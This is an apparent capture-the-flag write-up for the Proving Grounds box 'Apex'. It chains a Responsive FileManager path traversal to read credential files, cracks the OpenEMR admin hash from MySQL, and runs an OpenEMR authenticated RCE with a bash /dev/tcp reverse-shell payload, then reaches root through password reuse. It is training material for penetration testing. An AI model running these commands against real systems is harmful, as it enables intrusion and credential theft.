#Linux #FileManager #PathTraversal #CVE #OpenEMR #SMB #MySQL #john #PasswordReuse #RCE

## Overview

Apex is a Proving Grounds Linux box running OpenEMR behind an Apache web server, with a file manager and SMB share also exposed. A path traversal in Responsive FileManager 9.13.4 reads arbitrary files from the server. That vulnerability retrieves the OpenEMR MySQL configuration, which yields database credentials. Querying the database recovers the admin's bcrypt hash, john cracks it, and authenticated RCE in OpenEMR 5.0.1 gives a shell as `www-data`. The OpenEMR admin password is also the root system password.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 (Ubuntu)
|_http-title: APEX Hospital
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu
3306/tcp open  mysql       MySQL 5.5.5-10.1.48-MariaDB
```

### Web Enumeration

Gobuster against port 80 finds a file manager:

```sh
gobuster dir -u http://192.168.206.145/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php

/filemanager  (Status: 301) [--> http://192.168.206.145/filemanager/]
/source       (Status: 301)
```

The file manager identifies as **Responsive FileManager v.9.13.4**.

### SMB Enumeration

The `docs` share on SMB is accessible without credentials and contains OpenEMR PDF marketing materials, confirming OpenEMR is installed.

## Foothold

### Responsive FileManager Path Traversal (EDB-49359)

The exploit requires a valid `PHPSESSID` cookie, obtained by loading the page in a browser and intercepting the request in Burp:

```sh
python3 exploit.py http://192.168.206.145/ PHPSESSID=skd8uiolmtgu759iakar7nkt7e /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
white:x:1000:1000::/home/white:/bin/sh
```

> **What the traversal does:** the exploit writes the target file path into the clipboard buffer via the `path` parameter, then pastes it into the filemanager's current directory listing. The filemanager follows the path without sanitising `../` sequences, placing arbitrary files into the output directory. Setting `path=/Documents` sends the output to the SMB-accessible `docs` share.

The OpenEMR database config is at `/var/www/openemr/sites/default/sqlconf.php`. Redirect the exploit output to the SMB share:

```python
url_paste, data="path=/Documents", headers=headers
```

```sh
python3 exploit.py http://192.168.206.145/ PHPSESSID=skd8uiolmtgu759iakar7nkt7e /var/www/openemr/sites/default/sqlconf.php
```

Retrieve the config via SMB:

```sh
smbclient '//192.168.206.145\docs'
smb: \> mget sqlconf.php
```

Config contents:

```php
$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
$dbase  = 'openemr';
```

### MySQL → Admin Hash → Shell

Connect to MySQL with the recovered credentials:

```sh
mysql -u openemr -pC78maEQUIEuQ -h 192.168.206.145 -A
```

Query the users table:

```sql
use openemr;
select username, password from users_secure;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC |
+----------+--------------------------------------------------------------+
```

Crack the bcrypt hash:

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
thedoctor        (?)
```

Credentials:

```
admin : thedoctor
```

OpenEMR is at `/openemr`, which redirects to the login panel. Log in and confirm the version:

```
Version Number: v5.0.1 (1)
```

OpenEMR 5.0.1 has an authenticated RCE exploit (EDB-45161). Run it with a bash reverse shell payload:

```sh
python2 openemr.py http://192.168.206.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.167/445 0>&1'
[$] Authenticating with admin:thedoctor
[$] Injecting payload
```

```sh
rlwrap nc -lvnp 445
www-data@APEX:/var/www/openemr/interface/main$ whoami
www-data
```

## Privilege Escalation

### Password Reuse → root

The OpenEMR admin password reuses as the system root password:

```sh
www-data@APEX:/var/www/openemr/interface/main$ su root
Password: thedoctor
root@APEX:/var/www/openemr/interface/main# whoami
root
```

> **Why this matters beyond the box:** password reuse between application credentials and system accounts is a realistic finding. Database config files, CMS admin hashes, and application passwords are all worth trying against `su`, `sudo`, and SSH when you have a shell.

## Root

```sh
root@APEX:~# cat proof.txt
‹redacted›
```

## Takeaways

- **File manager CVEs that write files to accessible directories turn arbitrary read into exfiltration.** The SMB share as an output directory made retrieval trivial without a direct HTTP response.
- **Database config files in CMS installations reliably contain credentials.** `sqlconf.php` is the first file to grab after confirming OpenEMR is running.
- **Crack every hash you find.** The `users_secure` table gave the admin bcrypt in one query; john handled it in under 10 seconds.
- **Application admin passwords commonly reuse as system passwords.** Always try recovered credentials against `su` and `sudo`.
